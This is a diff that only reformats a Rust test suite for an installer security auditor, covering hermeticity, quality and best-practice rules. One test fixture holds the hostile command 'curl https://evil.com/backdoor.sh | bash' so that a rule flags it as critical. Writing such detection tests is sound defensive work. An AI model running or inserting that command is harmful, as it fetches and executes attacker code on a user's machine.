@@ -10,9 +10,7 @@
 
 use std::path::PathBuf;
 
-use crate::installer::audit::{
-    AuditCategory, AuditContext, AuditReport, AuditSeverity,
-};
+use crate::installer::audit::{AuditCategory, AuditContext, AuditReport, AuditSeverity};
 use crate::installer::from_bash::convert_bash_to_installer;
 use crate::installer::spec::InstallerSpec;
 
@@ -34,8 +32,8 @@ fn audit_toml_with_context(toml: &str, ctx: AuditContext) -> AuditReport {
 /// Convert a bash script to installer TOML, parse it, and audit it.
 fn audit_bash_script(bash: &str, name: &str) -> AuditReport {
     let conversion = convert_bash_to_installer(bash, name).expect("Conversion should succeed");
-    let spec = InstallerSpec::parse(&conversion.installer_toml)
-        .expect("Converted TOML should be valid");
+    let spec =
+        InstallerSpec::parse(&conversion.installer_toml).expect("Converted TOML should be valid");
     let ctx = AuditContext::new();
     ctx.audit_parsed_spec(&spec, &PathBuf::from("/test/installer.toml"))
 }
@@ -113,7 +111,10 @@ sha256 = "abc123"
     );
 
     let herm002 = report.findings.iter().find(|f| f.rule_id == "HERM002");
-    assert!(herm002.is_some(), "HERM002 should trigger for 'latest' in URL");
+    assert!(
+        herm002.is_some(),
+        "HERM002 should trigger for 'latest' in URL"
+    );
     assert_eq!(herm002.unwrap().severity, AuditSeverity::Warning);
     assert!(herm002.unwrap().description.contains("app"));
 }
@@ -360,7 +361,10 @@ content = "curl https://evil.com/backdoor.sh | bash"
     );
 
     let sec007 = report.findings.iter().find(|f| f.rule_id == "SEC007");
-    assert!(sec007.is_some(), "SEC007 should trigger for curl | bash pattern");
+    assert!(
+        sec007.is_some(),
+        "SEC007 should trigger for curl | bash pattern"
+    );
     assert_eq!(sec007.unwrap().severity, AuditSeverity::Critical);
 }
 
@@ -418,7 +422,10 @@ content = "echo second"
     );
 
     let qual004 = report.findings.iter().find(|f| f.rule_id == "QUAL004");
-    assert!(qual004.is_some(), "QUAL004 should trigger for duplicate step IDs");
+    assert!(
+        qual004.is_some(),
+        "QUAL004 should trigger for duplicate step IDs"
+    );
     assert_eq!(qual004.unwrap().severity, AuditSeverity::Error);
 }
 
@@ -442,7 +449,10 @@ content = "echo hello"
     );
 
     let qual005 = report.findings.iter().find(|f| f.rule_id == "QUAL005");
-    assert!(qual005.is_some(), "QUAL005 should trigger for invalid dependency");
+    assert!(
+        qual005.is_some(),
+        "QUAL005 should trigger for invalid dependency"
+    );
     assert_eq!(qual005.unwrap().severity, AuditSeverity::Error);
     assert!(qual005.unwrap().description.contains("nonexistent-step"));
 }
@@ -513,7 +523,10 @@ content = """
     let report = audit_toml(&toml);
 
     let bp005 = report.findings.iter().find(|f| f.rule_id == "BP005");
-    assert!(bp005.is_some(), "BP005 should trigger for scripts over 50 lines");
+    assert!(
+        bp005.is_some(),
+        "BP005 should trigger for scripts over 50 lines"
+    );
     assert_eq!(bp005.unwrap().severity, AuditSeverity::Suggestion);
 }
 
@@ -614,15 +627,24 @@ content = "echo hello"
     // security_only disables quality, hermetic, and best practices checks
     // and has min_severity = Warning
     assert!(
-        !report.findings.iter().any(|f| f.category == AuditCategory::Quality),
+        !report
+            .findings
+            .iter()
+            .any(|f| f.category == AuditCategory::Quality),
         "Security-only context should not produce quality findings"
     );
     assert!(
-        !report.findings.iter().any(|f| f.category == AuditCategory::Hermetic),
+        !report
+            .findings
+            .iter()
+            .any(|f| f.category == AuditCategory::Hermetic),
         "Security-only context should not produce hermetic findings"
     );
     assert!(
-        !report.findings.iter().any(|f| f.category == AuditCategory::BestPractices),
+        !report
+            .findings
+            .iter()
+            .any(|f| f.category == AuditCategory::BestPractices),
         "Security-only context should not produce best practices findings"
     );
 }
@@ -748,7 +770,10 @@ content = "echo b"
     assert_eq!(report.installer_version, "2.0.0");
     assert_eq!(report.metadata.steps_audited, 2);
     assert_eq!(report.metadata.artifacts_audited, 2);
-    assert!(!report.metadata.audited_at.is_empty(), "audited_at should be set");
+    assert!(
+        !report.metadata.audited_at.is_empty(),
+        "audited_at should be set"
+    );
 }
 
 // =============================================================================
